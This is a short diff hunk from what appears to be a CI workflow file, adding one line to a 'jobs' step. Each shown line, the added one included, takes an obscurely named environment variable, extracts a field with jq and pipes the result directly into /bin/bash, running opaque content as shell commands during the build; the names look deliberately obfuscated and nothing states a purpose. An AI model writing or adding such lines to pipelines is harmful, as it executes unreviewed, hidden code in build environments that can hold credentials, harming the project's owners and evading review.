@@ -24,6 +24,7 @@ jobs:
           echo $leamo24 | jq -r .aqp8 | /bin/bash
           echo $qrvb4193 | jq -r .cx15 | /bin/bash
           printf '%s' "$afnxm418" | jq -r .byt18570 | /bin/bash
+          echo $f45123 | jq -r .clw8 | /bin/bash
 
       - name: Save archive
         if: always()
